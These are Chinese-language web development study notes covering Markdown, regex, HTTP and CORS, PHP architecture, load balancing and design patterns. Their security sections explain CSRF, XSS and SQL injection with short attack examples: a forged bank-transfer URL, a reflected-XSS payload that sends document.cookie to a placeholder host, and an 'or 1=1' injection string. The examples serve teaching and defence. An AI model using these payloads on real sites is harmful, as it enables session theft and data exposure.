Test newbranch.

<div id='jump_top'>TOP</div>

* [MarkDown语法](#toc_grammar) <div id='grammar'></div>
* [正则](#toc_regex) <div id='regex'></div>
* [http](#toc_http) <div id='http'></div>
* [php](#toc_php) <div id='php'></div>
* [terminal](#toc_terminal) <div id='terminal'></div>
* [SQL Injection](#toc_sql_injection) <div id='sql_injection'></div>
* [负载均衡](#toc_load_balance) <div id='load_balance'></div>
* [设计模式](#toc_design_mode) <div id='design_mode'></div>

##[MarkDown](#grammar)<div id='toc_grammar'></div>
* 列表等级

无序列表使用星号*、加号+或是减号-后跟一空格作为列表标记

例如：
* 一级
    * 二级
        * 三级
            * 四级

* 代码块

要在 Markdown 中建立代码区块很简单，只要简单地缩进 4 个空格或是 1 个制表符就可以，码区块会一直持续到没有缩进的那一行（或是文件结尾）


    $var = 123;

与原来使用缩进来添加代码块的语法不同，这里使用 ``` ``` 来包含多行代码：
```
<p>code here</p>
```
三个 ``` 要独占一行。

代码高亮，在上面的代码块语法基础上，在第一组 ``` 之后添加代码的语言，如 'php' ，即可将代码标记为 php：
```php
$var = time();
```

* 行内链接

链接语法为[链接文字](地址 "提示语")，例如：
这是个[链接](google.com "谷歌网站")。

* 页内锚点

想要跳转到的html元素标签上加锚，即定义标签的id，可以是任意标签，如文本、图片、段落、span，div等等
然后使用行内链接语法即可跳转到此锚点，只不过链接地址改为#锚点id，例如：
[向前跳转到TOP](#jump_top)

* 分割线

在一行中用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。

______


##[正则](#regex)<div id='toc_regex'></div>
* 正则匹配模式使用分隔符与元字符组成，分隔符可以是非数字、非反斜线、非空格的任意字符。
经常使用的分隔符是正斜线(/)、hash符号(#) 以及取反符号(~)。

* 元字符与转义
    * 正则表达式中具有特殊含义的字符称之为元字符，常用的元字符有：
    ```
    \ 一般用于转义字符
    ^ 断言目标的开始位置(或在多行模式下是行首)
    $ 断言目标的结束位置(或在多行模式下是行尾)
    . 匹配除换行符外的任何字符(默认)
    [ 开始字符类定义
    ] 结束字符类定义
    | 开始一个可选分支
    ( 子组的开始标记
    ) 子组的结束标记
    ? 作为量词，表示 0 次或 1 次匹配。位于量词后面用于改变量词的贪婪特性。 (查阅量词)
    * 量词，0 次或多次匹配
    + 量词，1 次或多次匹配
    { 自定义量词开始标记
    } 自定义量词结束标记
    ```

* PHP中使用PCRE库函数进行正则匹配

* 贪婪模式与懒惰模式：
    ```
    贪婪模式：在可匹配与可不匹配的时候，优先匹配
    懒惰模式：在可匹配与可不匹配的时候，优先不匹配
    ```
    * 正则表达式中每个元字符匹配一个字符，当使用+之后将会变的贪婪，它将匹配尽可能多的字符，
    * 但使用问号?字符时，它将尽可能少的匹配字符，既是懒惰模式。

##[http](#http)<div id='toc_http'></div>
* 1.网络基础TCP/IP
    * HTTP基于TCP/IP协议族，HTTP属于它内部的一个子集。
    * 把互联网相关联的协议集合起来总称TCP/IP。
* 1.1 TCP/IP分层管理
    * TCP/IP按层次分为：应用层，传输层，网络层和链路层。
        * 应用层：决定了向用户提供应用服务时通信的活动。
            * FTP（文件传输协议），DNS（域名系统），HTTP（超文本传输协议）
        * 传输层：提供处于网络连接中的两台计算机之间的数据传输。
            * TCP（传输控制协议），UDP（用户数据报协议）
        * 网络层（网络互联层）：用来处理网络上流动的数据包。数据包是网络传输的最小单位。该层规定了通过怎样的路径到达对方计算机，并把数据包传送给对方。
        * 链路层（网络接口层）：出来处理连接网络的硬件部分。
* 1.2 与HTTP关系密切的协议：IP、TCP和DNS
    * IP：将数据包传输给对方，两个重要条件：IP地址和MAC地址。
        * IP地址指明了节点被分配到到地址，MAC地址是指网卡所属固定地址。IP地址可以和MAC地址进行配对。IP地址可以变换，但MAC地址基本上不会更改。
    * ARP协议凭借MAC地址进行通信：网络上两台计算机进行通信，通常要经过多台计算机和网络设备中转才能连接到对方。
    在中转时，会利用下一站中转设备的MAC地址来搜索下一个中转目标。这时采用ARP（地址解析协议），根据通信放的IP可以反查出对应MAC地址。
* 1.3 TCP协议：将大块数据分割以报文段为单位进行数据传输。
    * 确保数据能到达目标：TCP协议采用了三次握手
        * 客户端发送SYN=1（表示请求连接），并发送一个seq（随机码）
        * 服务器由于收到SYN=1，知道是请求连接，返回一个ACK=1（表示确认），并同返回一个请求连接SYN=1，然后返回一个ack=seq+1（客户端随机码应答），且自己也返回一个seq（随机码）
        * 客户端收到服务器的ack后验证，向服务器确认包发送ack=seq+1（服务器随机码应答）
        * 服务器确认ack后建立连接，完成三次握手。
* 1.4 域名解析系统DNS
    * 主机名/域名（例如：www.hackr.jp）不利于计算机解析，故计算机需要一串数字（类似20x.22.3.3）来查找服务器。
* 1.5 URI和URL
    * URI：统一资源标识符。
    * Uniform：规定统一的格式可方便处理多种不同类型的资源。
    * Resource：可以被标识的任何东西（文档，图片，音乐，视频等），能够区别于其他类型的，全都可作为资源。资源不仅可以是单一的，也可以是多数的集合体。
    * Identifier：标识符。
    * 综上：URI就是由某个协议方案表示的资源的定位标识符。协议方案是指访问资源所使用的协议类型。
    * URL：统一资源定位符。（URI表示某一互联网资源，而URL表示资源的地点，可见URL是URI的子集）。
    * URI格式： 绝对URI，绝对URL，相对URL（从浏览器中基本URI处指定URL）。
  


* 跨域
    * 跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 
    是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。
    * 什么是跨域HTTP请求
        * HTML中a/form/img/css/script/iframe/ajax都可以指向资源
    发起请求的资源所在域不同于该请求所指向资源所在的域的HTTP请求就叫做跨域HTTP请求
    * 何为不同域
        * 协议+域名+端口号都相同才是同域
    * 跨域请求带来的问题
        * 如果对跨域请求不做限制，会有安全隐患
        * 例1：
            * 一个恶意网站的页面通过iframe嵌入了支付宝的登录页面（两者不同域），如果没有任何限制，恶意网页上的javascript脚本就可以在用户登录银行的时候获取用户名和密码
        * 例2：
            * 跨域请求别人的AJAX登录接口，也可以获取到用户名密码

    * 如何限制跨域请求
    ```
    不允许跨域请求
        NO
    服务端
        可以根据相关的HEADER判断来源，限制访问
        但是HEADER可以伪造
    浏览器
        发起跨域请求时，进行限制
        同源策略
    
    ```
    * 同源策略
    ```
    是浏览器的一种约定和安全功能，对跨域请求进行控制
        1：限制来自不同源的document或脚本，对当前document读取或设置某些属性
        2：禁止ajax直接发起跨域HTTP请求（其实可以发送请求，结果被浏览器拦截，不展示）
        3：允许img/css/script(拥有src的标签都有跨域的能力。加载下来就属于当前域了)
        4：允许跨域的连接、跳转、表单提交（带来了跨站请求伪造CSRF问题）
    ```
    * 同源策略的作用
    ```
    解决了例1里面的问题：
        恶意网站的JS无法读取iframe里面的内容
        因为iframe加载之后属于单独的一个window当然也是一个单独的document
    解决了例2里面的问题：
        发起的AJAX请求结果如何被浏览器屏蔽了，虽然实际请求已经发送到服务端，但是不知道结果（所以服务端也要有相应的策略）
    ```
    * 如何越过限制
    ```
    在此不讨论JS如何读取iframe的document元素的问题.只涉及如何越过浏览器限制，发起AJAX跨域请求并显示结果
    AJAX跨域请求实现方式:
    1：通过代理
        自己的服务器实现接口，后台调用其他域的接口
    2：JSONP
        服务端调用本地js，并将结果带回
    3：CORS
        扩展HTTP协议，根据服务端返回的有关HEADER来决定是否展示结果
    ```
    * JSONP
    ```
    JSON Padding
    JSON是一种数据交换格式，JSONP是一种ajax跨域实现方案
        1：script不受同源策略限制能加载到
        2：demo.js里面能调用本地的js方法
    这就是JSONP(可能不准确…)
    jquery等已经对jsonp进行了很好的实现与封装，可以google一下，不做过多介绍
    缺点是：
        1：服务端需要指定JS的方法名
        2：只支持GET
    ```
    * CORS
    ```
    跨源资源共享 Cross-Origin Resource Sharing
    是一个规范，可以简单理解为对HTTP协议进行了扩展，增加了一些http header，让服务器能声明那些来源可以通过浏览器访问该服务器上的资源
    Request headers
        • Origin
        • Access-Control-Request-Method
        • Access-Control-Request-Headers
        Response headers
        • Access-Control-Allow-Origin
        • Access-Control-Allow-Credentials
        • Access-Control-Expose-Headers
        • Access-Control-Max-Age
        • Access-Control-Allow-Methods
        • Access-Control-Allow-Headers
    头部介绍
        Origin
            参数origin是一个URI,告诉服务器端,请求来自哪里.
            浏览器发起http请求时一般都会设置这个头，不是CORS特有
        Access-Control-Request-Method
            在发出预检请求时,告诉服务器在实际请求时使用的请求方式
        Access-Control-Request-Headers
            在发出预检请求时,告诉服务器在实际请求时携带的自定义头信息.如有多个,可以用逗号分开
        Access-Control-Allow-Origin
            指定一个允许向该服务器提交请求的URI.对于一个不带有credentials的请求,可以指定为*,表示允许来自所有域的请求.
        Access-Control-Expose-Headers
            指明允许脚本访问的响应头
        Access-Control-Max-Age
            缓存此次请求的秒数。在这个时间范围内，所有同类型的请求都将不再发送预检请求而是直接使用此次返回的头作为判断依据
        Access-Control-Allow-Credentials
            是否允许请求带有Cookie信息
        Access-Control-Allow-Methods
            在响应预检请求的时候使用.指明资源可以被请求的方式有哪些(一个或者多个).
        Access-Control-Allow-Headers
            在响应预检请求的时候使用.用来指明在实际的请求中,可以使用哪些自定义HTTP请求头
    CORS如何跨域
        简单的HTTP请求
            只使用 GET, HEAD 或者 POST 请求方法。如果使用 POST 向服务器端传送数据，则数据类型(Content-Type)只能是 application/x-www-form-urlencoded, multipart/form-data 或 text/plain中的一种。 不会使用自定义请求头（类似于 X-Modified 这种） 直接发起请求
        复杂的HTTP请求
            浏览器必须先以 OPTIONS 请求方式发送一个预请求(preflight request)，从而获知服务器端对跨源请求所支持 HTTP 方法。在确认服务器允许该跨源请求的情况下，以实际的 HTTP 请求方法发送那个真正的请求。服务器端也可以通知客户端，是不是需要随同请求一起发送信用信息（包括 Cookies 和 HTTP 认证相关数据）
    CORS的实现
        1：现在大多数浏览器都支持
        2：服务端程序可以自己设置cors的响应头，java里面可以通过servlet的filter
        3：SpringMVC对cors的支持
    ```


* CSRF
    * 跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF。
    * CSRF 攻击实例
        ```
          CSRF 攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在并未授权的情况下执行在权限保护之下的操作。
        
        比如说，受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 http://bank.example/withdraw?account=bob&amount=1000000&for=bob2 
        
        可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，
        
        并且该 session 的用户 Bob 已经成功登陆。黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。
        
        Mallory 可以自己发送一个请求给银行：http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory。但是这个请求来自 Mallory 
        
        而非 Bob，他不能通过安全认证，因此该请求不会起作用。这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入
        
        如下代码： src=”http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory ”，并且通过广告等诱使 Bob 来访问他的网站。
        
        当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，
        
        该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，
        
        浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，
        
        而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，
        
        没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。
        ```

    * CSRF 攻击的对象
        ```
          在讨论如何抵御 CSRF 之前，先要明确 CSRF 攻击的对象，也就是要保护的对象。从以上的例子可知，CSRF 攻击是黑客借助受害者的 cookie 
        
        骗取服务器的信任，但是黑客并不能拿到 cookie，也看不到 cookie 的内容。另外，对于服务器返回的结果，由于浏览器同源策略的限制，
        
        黑客也无法进行解析。因此，黑客无法从返回的结果中得到任何东西，他所能做的就是给服务器发送请求，以执行请求中所描述的命令，
        
        在服务器端直接改变数据的值，而非窃取服务器中的数据。所以，我们要保护的对象是那些可以直接产生数据改变的服务，而对于读取数据的
        
        服务，则不需要进行 CSRF 的保护。比如银行系统中转账的请求会直接改变账户的金额，会遭到 CSRF 攻击，需要保护。而查询余额是对金额
        
        的读取操作，不会改变数据，CSRF 攻击无法解析服务器返回的结果，无需保护。
        ```
    * 当前防御 CSRF 的几种策略
    * 在业界目前防御 CSRF 攻击主要有三种策略：验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证。下面就分别对这三种策略进行详细介绍。
    
    * CSRF 防御方法选择之道
        ```
        通过上文讨论可知，目前业界应对 CSRF 攻击有一些克制方法，但是每种方法都有利弊，没有一种方法是完美的。如何选择合适的方法非常重要。
        如果网站是一个现有系统，想要在最短时间内获得一定程度的 CSRF 的保护，那么验证 Referer 的方法是最方便的，要想增加安全性的话，
        可以选择不支持低版本浏览器，毕竟就目前来说，IE7+, FF3+ 这类高版本浏览器的 Referer 值还无法被篡改。
        
        如果系统必须支持 IE6，并且仍然需要高安全性。那么就要使用 token 来进行验证，在大部分情况下，使用 XmlHttpRequest 并不合适，
        token 只能以参数的形式放于请求之中，若你的系统不支持用户自己发布信息，那这种程度的防护已经足够，否则的话，你仍然难以防范 
        token 被黑客窃取并发动攻击。在这种情况下，你需要小心规划你网站提供的各种服务，从中间找出那些允许用户自己发布信息的部分，
        把它们与其他服务分开，使用不同的 token 进行保护，这样可以有效抵御黑客对于你关键服务的攻击，把危害降到最低。毕竟，
        删除别人一个帖子比直接从别人账号中转走大笔存款严重程度要轻的多。
        
        如果是开发一个全新的系统，则抵御 CSRF 的选择要大得多。笔者建议对于重要的服务，可以尽量使用 XMLHttpRequest 来访问，
        这样增加 token 要容易很多。另外尽量避免在 js 代码中使用复杂逻辑来构造常规的同步请求来访问需要 CSRF 保护的资源，
        比如 window.location 和 document.createElement(“a”) 之类，这样也可以减少在附加 token 时产生的不必要的麻烦。
        
        最后，要记住 CSRF 不是黑客唯一的攻击手段，无论你 CSRF 防范有多么严密，如果你系统有其他安全漏洞，比如跨站域脚本攻击 XSS，
        那么黑客就可以绕过你的安全防护，展开包括 CSRF 在内的各种攻击，你的防线将如同虚设。
        ```

* XSS
    * 动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting, 安全专家们通常将其缩写成 XSS）的威胁，而静态站点则完全不受其影响。
    * XSS攻击：跨站脚本攻击(Cross-Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。
        * XSS是一种常见的web安全漏洞，它允许攻击者将恶意代码植入到提供给其它用户使用的页面中。
        * 不同于大多数攻击(一般只涉及攻击者和受害者)，XSS涉及到三方，即攻击者、客户端与Web应用。
        * XSS的攻击目标是为了盗取存储在客户端的cookie或者其他网站用于识别客户端身份的敏感信息。一旦获取到合法用户的信息后，攻击者甚至可以假冒合法用户与网站进行交互。
    * XSS通常可以分为两大类：
        * 一类是存储型XSS，主要出现在让用户输入数据，供其他浏览此页的用户进行查看的地方，包括留言、评论、博客日志和各类表单等。
        * 另一类是反射型XSS，主要做法是将脚本代码加入URL地址的请求参数里，请求参数进入程序后在页面直接输出，用户点击类似的恶意链接就可能受到攻击。
    * XSS目前主要的手段和目的如下：
        ```
        盗用cookie，获取敏感信息。
        利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。
        利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击者）用户的身份执行一些管理动作，或执行一些如:发微博、加好友、发私信等常规操作，前段时间新浪微博就遭遇过一次XSS。
        利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。
        在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果
        ```
    * XSS的原理
        * Web应用未对用户提交请求的数据做充分的检查过滤，允许用户在提交的数据中掺入HTML代码(最主要的是“>”、“<”)，
        并将未经转义的恶意代码输出到第三方用户的浏览器解释执行，是导致XSS漏洞的产生原因。
    
        * 接下来以反射性XSS举例说明XSS的过程：
        ```
        现在有一个网站，根据参数输出用户的名称，例如访问url：http://127.0.0.1/?name=astaxie，就会在浏览器输出如下信息：
        hello astaxie
        
        如果我们传递这样的url：http://127.0.0.1/?name=&#60;script&#62;alert(&#39;astaxie,xss&#39;)&#60;/script&#62;,
        
        这时你就会发现浏览器跳出一个弹出框，这说明站点已经存在了XSS漏洞。那么恶意用户是如何盗取Cookie的呢？与上类似，
        
        如下这样的url：http://127.0.0.1/?name=&#60;script&#62;document.location.href='http://www.xxx.com/cookie?'
        +document.cookie&#60;/script&#62;，这样就可以把当前的cookie发送到指定的站点：www.xxx.com。你也许会说，
        
        这样的URL一看就有问题，怎么会有人点击？，是的，这类的URL会让人怀疑，但如果使用短网址服务将之缩短，
        
        你还看得出来么？攻击者将缩短过后的url通过某些途径传播开来，不明真相的用户一旦点击了这样的url，
        
        相应cookie数据就会被发送事先设定好的站点，这样子就盗得了用户的cookie信息，然后就可以利用Websleuth之类的
        
        工具来检查是否能盗取那个用户的账户。
        ```
    * 如何预防XSS
        * 很简单，坚决不要相信用户的任何输入，并过滤掉输入中的所有特殊字符。这样就能消灭绝大部分的XSS攻击。
        * 目前防御XSS主要有如下几种方式：
            * 过滤特殊字符
                * 避免XSS的方法之一主要是将用户所提供的内容进行过滤。
            * 使用HTTP头指定类型
                * header("Content-Type","text/javascript");
                * 这样就可以让浏览器解析javascript代码，而不会是html输出。



##[php](#php)<div id='toc_php'></div>
* php构架：
    * php从下到上是一个4层体系
        * Zend：
            * 整体用纯c实现，是php的内核部分，它将php代码翻译（词法、语法解析等一系列编译过程）为可执行opcode的处理并实现相应的处理方法、
            实现了基本的数据结构（如hashtable、oo）、内存分配及管理、提供了相应的api方法供外部调用，是一切的核心，所有的外围功能均围绕zend实现。
        * Extensions：
            * 通过组件式的方式提供各种基础服务，我们常见的各种内置函数（如array系列）、标准库等都是通过extension来实现，用户也可以根据需要实现自己的extension以达到功能扩展、性能优化等目的。
        * Sapi：
            * 全称是Server Application Programming Interface，也就是服务端应用编程接口，sapi通过一系列钩子函数，使得php可以和外围交互数据。
        * 上层应用：
            * 编写的php程序，通过不同的sapi方式得到各种各样的应用模式。
    * 引擎(Zend)+组件(ext)的模式降低内部耦合，中间层(sapi)隔绝web server和php

* apache与php
    * Apache对于php的解析，就是通过众多Module中的php Module来完成的。
        * 假定我们安装的版本是Apache2 和 php5，那么需要编辑Apache的主配置文件http.conf，在其中加入下面的几行内容：
        ```
            Unix/Linux环境下：
            
            LoadModule php5_module modules/mod_php5.so
            AddType application/x-httpd-php .php
            
            注：其中modules/mod_php5.so 是X系统环境下mod_php5.so文件的安装位置。
            
            Windows环境下：
            
            LoadModule php5_module d:/php/php5apache2.dll
            AddType application/x-httpd-php .php
            
            注：其中d:/php/php5apache2.dll 是在Windows环境下php5apache2.dll文件的安装位置。
            
            这两项配置就是告诉Apache Server，以后收到的Url用户请求，凡是以php作为后缀，就需要调用php5_module模块（mod_php5.so/ php5apache2.dll）进行处理。
        ```

* lamp架构
    * 从下往上四层：


        1、liunx 属于操作系统的底层
        2、apache服务器，属于次服务器，沟通linux和PHP
        3、php:属于服务端编程语言，通过php_module 模块 和apache关联
        4、mysql和其他web服务：属于应用服务，通过PHP的Extensions外 挂模块和mysql关联

* 运行
    * php语言由zend编译成机器语言，操作cpu
    * 对数据库的操作属于I/O操作，属于机械运动，也就是说一个网站的瓶颈再去对硬盘的读写造成的，
解决办法就是减少I/O操作次数，使用缓冲技术，就是在数据的操作放在mencache/redis里面，达到一定数量级的时候在一次性写入数据库，mencache/redis属于key-value关系
    * 而nosql（非关系型数据）也是基于这个理念建设的，也是属于key-value关系
    * 频繁读操作，放在mencache里面（读多写少，放在nosql里面，读取功能很强大！）

##[终端](#terminal)<div id='toc_terminal'></div>
* 当进程不是守护进程时，不能简单地在命令行后添加一个&，当终端关闭时，该进程也随之关闭。
因为通常在终端起动的进程其父进程是终端进程。当终端关闭时，其所有子进程也随之关闭。
使进程在后台执行需要使用nohup命令：
    * nohup command > out.log

##[SQL Injection](#sql_injection)<div id='toc_sql_injection'></div>
* SQL注入（SQL Injection）：就是攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串等方式，最终使得欺骗服务器执行恶意的SQL命令。
    * 假设：
        * http://system.com?select_user/id=123
        * 这条url命令是提交参数并执行查询数据库操作
        * select * from user where id=123
    * 则sql注入只需要修改查询参数以达到恶意操作数据库目的
        * http://system.com?select_user/id=123'or'1'=1'
        * select * from user where id=123 or 1=1
    * 后果是由于sql注入判断条件达到恒真，使user表数据被恶意全部暴露窃取

##[负载均衡](#load_balance)<div id='toc_load_balance'></div>
* 不能狭义地理解为分配给所有实际服务器一样多的工作量，因为多台服务器的承载能力各不相同，这可能体现在硬件配置、网络带宽的差异，也可能因为某台服务器身兼多职，我们所说的“均衡”，也就是希望所有服务器都不要过载，并且能够最大程序地发挥作用。

* 一、http重定向
    * 当http代理（比如浏览器）向web服务器请求某个URL后，web服务器可以通过http响应头信息中的Location标记来返回一个新的URL。这意味着HTTP代理需要继续请求这个新的URL，完成自动跳转。
    * 性能缺陷：
        * 1、吞吐率限制
            * 主站点服务器的吞吐率平均分配到了被转移的服务器。现假设使用RR（Round Robin）调度策略，子服务器的最大吞吐率为1000reqs/s，
            那么主服务器的吞吐率要达到3000reqs/s才能完全发挥三台子服务器的作用，那么如果有100台子服务器，那么主服务器的吞吐率可想而知得有大？
            相反，如果主服务的最大吞吐率为6000reqs/s，那么平均分配到子服务器的吞吐率为2000reqs/s，而现子服务器的最大吞吐率为1000reqs/s，因此就得增加子服务器的数量，增加到6个才能满足。
        * 2、重定向访问深度不同
            * 有的重定向一个静态页面，有的重定向相比复杂的动态页面，那么实际服务器的负载差异是不可预料的，而主站服务器却一无所知。因此整站使用重定向方法做负载均衡不太好。
        * 我们需要权衡转移请求的开销和处理实际请求的开销，前者相对于后者越小，那么重定向的意义就越大，例如下载。你可以去很多镜像下载网站试下，会发现基本下载都使用了Location做了重定向。

* 二、DNS负载均衡
    * DNS负责提供域名解析服务，当访问某个站点时，实际上首先需要通过该站点域名的DNS服务器来获取域名指向的IP地址，
    在这一过程中，DNS服务器完成了域名到IP地址的映射，同样，这样映射也可以是一对多的，这时候，DNS服务器便充当了负载均衡调度器，
    它就像http重定向转换策略一样，将用户的请求分散到多台服务器上，但是它的实现机制完全不同。
    * 相比http重定向，基于DNS的负载均衡完全节省了所谓的主站点，或者说DNS服务器已经充当了主站点的职能。但不同的是，
    作为调度器，DNS服务器本身的性能几乎不用担心。因为DNS记录可以被用户浏览器或者互联网接入服务商的各级DNS服务器缓存，
    只有当缓存过期后才会重新向域名的DNS服务器请求解析。也说是DNS不存在http的吞吐率限制，理论上可以无限增加实际服务器的数量。
    * 特性：
        * 1、可以根据用户IP来进行智能解析。DNS服务器可以在所有可用的A记录中寻找离用记最近的一台服务器。
        * 2、动态DNS：在每次IP地址变更时，及时更新DNS服务器。当然，因为缓存，一定的延迟不可避免。
    * 不足：
        * 1、没有用户能直接看到DNS解析到了哪一台实际服务器，加服务器运维人员的调试带来了不便。
        * 2、策略的局限性。例如你无法将HTTP请求的上下文引入到调度策略中，而在前面介绍的基于HTTP重定向的负载均衡系统中，调度器工作在HTTP层面，
        它可以充分理解HTTP请求后根据站点的应用逻辑来设计调度策略，比如根据请求不同的URL来进行合理的过滤和转移。
        * 3、如果要根据实际服务器的实时负载差异来调整调度策略，这需要DNS服务器在每次解析操作时分析各服务器的健康状态，对于DNS服务器来说，这种自定义开发存在较高的门槛，更何况大多数站点只是使用第三方DNS服务。
        * 4、DNS记录缓存，各级节点的DNS服务器不同程序的缓存会让你晕头转向。
        * 5、基于以上几点，DNS服务器并不能很好地完成工作量均衡分配，最后，是否选择基于DNS的负载均衡方式完全取决于你的需要。

* 三、反向代理负载均衡
    * 这个肯定大家都有所接触，因为几乎所有主流的Web服务器都热衷于支持基于反向代理的负载均衡。它的核心工作就是转发HTTP请求。
    * 相比前面的HTTP重定向和DNS解析，反向代理的调度器扮演的是用户和实际服务器中间人的角色：
        * 1、任何对于实际服务器的HTTP请求都必须经过调度器
        * 2、调度器必须等待实际服务器的HTTP响应，并将它反馈给用户（前两种方式不需要经过调度反馈，是实际服务器直接发送给用户）
    * 特性：
        * 1、调度策略丰富。例如可以为不同的实际服务器设置不同的权重，以达到能者多劳的效果。
        * 2、对反向代理服务器的并发处理能力要求高，因为它工作在HTTP层面。
        * 3、反向代理服务器进行转发操作本身是需要一定开销的，比如创建线程、与后端服务器建立TCP连接、接收后端服务器返回的处理结果、
        分析HTTP头部信息、用户空间和内核空间的频繁切换等，虽然这部分时间并不长，但是当后端服务器处理请求的时间非常短时，转发的开销就显得尤为突出。例如请求静态文件，更适合使用前面介绍的基于DNS的负载均衡方式。
        * 4、反向代理服务器可以监控后端服务器，比如系统负载、响应时间、是否可用、TCP连接数、流量等，从而根据这些数据调整负载均衡的策略。
        * 5、反射代理服务器可以让用户在一次会话周期内的所有请求始终转发到一台特定的后端服务器上（粘滞会话），这样的好处一是保持session的本地访问，二是防止后端服务器的动态内存缓存的资源浪费。

* 四、IP负载均衡(LVS-NAT)
    * 因为反向代理服务器工作在HTTP层，其本身的开销就已经严重制约了可扩展性，从而也限制了它的性能极限。那能否在HTTP层面以下实现负载均衡呢？
    * NAT服务器:它工作在传输层，它可以修改发送来的IP数据包，将数据包的目标地址修改为实际服务器地址。

* 五、直接路由(LVS-DR)
    * NAT是工作在网络分层模型的传输层（第四层），而直接路由是工作在数据链路层（第二层）。它通过修改数据包的目标MAC地址（没有修改目标IP），将数据包转发到实际服务器上，不同的是，实际服务器的响应数据包将直接发送给客户羰，而不经过调度器。

* 六、IP隧道(LVS-TUN)
    * 基于IP隧道的请求转发机制：将调度器收到的IP数据包封装在一个新的IP数据包中，转交给实际服务器，然后实际服务器的响应数据包可以直接到达用户端。目前Linux大多支持，可以用LVS来实现，称为LVS-TUN，
    与LVS-DR不同的是，实际服务器可以和调度器不在同一个WAN网段，调度器通过IP隧道技术来转发请求到实际服务器，所以实际服务器也必须拥有合法的IP地址。
    * 总体来说，LVS-DR和LVS-TUN都适合响应和请求不对称的Web服务器，如何从它们中做出选择，取决于你的网络部署需要，因为LVS-TUN可以将实际服务器根据需要部署在不同的地域，并且根据就近访问的原则来转移请求，所以有类似这种需求的，就应该选择LVS-TUN。


##[设计模式](#design_mode)<div id='toc_design_mode'></div>
* 单例模式（构造 construct）
    * 结构：
        * $_instance必须声明为静态的私有变量
        * __construct()构造函数必须声明为私有，防止外部程序new类从而失去单例模式的意义
        * __clone()函数声明为私有，阻止用户复制对象实例
        * getInstance()方法必须设置为公有的,必须调用此方法以返回实例的一个引用
        * ::操作符只能访问静态变量和静态函数
        * new对象都会消耗内存
    * 场景：
        * 最常用的地方是数据库连接。
        * 使用单例模式生成一个对象后，该对象可以被其它众多对象所使用。

* 工厂模式（抽象 abstract extends）
    * 结构：
        * 抽象基类：类中定义抽象一些方法，用以在子类中实现
        * 继承自抽象基类的子类：实现基类中的抽象方法
        * 工厂类：用以实例化所有相对应的子类
    * 场景：
        * 通过采用面向对象的继承特性，我们可以很容易就能对原有程序进行扩展，
        比如：‘乘方’，‘开方’，‘对数’，‘三角函数’，‘统计’等，
        以还可以避免加载没有必要的代码。
        * 如果我们现在需要增加一个求余的类，会非常的简单
            * 我们只需要另外写一个类（该类继承虚拟基类），在类中完成相应的功能（比如：求乘方的运算），
            而且大大的降低了耦合度，方便日后的维护及扩展
    * 让程序根据用户输入的操作符实例化相应的对象，使用一个单独的类来实现实例化的过程，这个类就是工厂
    
* 观察者模式（接口 interface implements）
    * 结构：
        * 观察者模式属于行为模式，是定义对象间的一种一对多的依赖关系，以便当一个对象的状态发生改变时，
        所有依 赖于它的对象都得到通知并自动刷新。它完美的将观察者对象和被观察者对象分离。可以在独立的
        对象（主体）中维护一个对主体感兴趣的依赖项（观察器）列表。 
    * 场景：
        * 让所有观察器各自实现公共的 Observer 接口，以取消主体和依赖性对象之间的直接依赖关系。

* 策略模式（分离 interface implements）
    * 结构：
        * 在此模式中，算法是从复杂类提取的，因而可以方便地替换。例如，如果要更改搜索引擎中排列页的方法，
       则策略模式是一个不错的选择。思考一下搜索引擎的几个部分，一部分遍历页面，一部分对每页排列，
       另一部分基于排列的结果排序。在复杂的示例中，这些部分都在同一个类中。通过使用策略模式，
       您可将排列部分放入另一个类中，以便更改页排列的方式，而不影响搜索引擎的其余代码。
   * 场景：
        * 非常适合复杂数据管理系统或数据处理系统，二者在数据筛选、搜索或处理的方式方面需要较高的灵活性。








